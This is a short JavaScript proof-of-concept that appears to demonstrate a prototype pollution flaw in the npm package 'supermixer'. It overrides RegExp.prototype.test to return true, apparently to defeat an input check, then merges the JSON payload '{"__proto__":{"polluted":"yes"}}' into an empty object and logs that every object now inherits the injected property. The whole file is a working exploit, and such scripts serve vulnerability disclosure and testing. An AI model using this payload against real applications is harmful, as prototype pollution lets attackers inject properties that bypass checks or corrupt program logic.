RegExp.prototype.test = () => true;
var mixer = require('supermixer');
obj = {};
console.log({}.polluted);
var payload = '{"__proto__":{"polluted":"yes"}}';
mixer.merge({}, JSON.parse(payload));
console.log({}.polluted);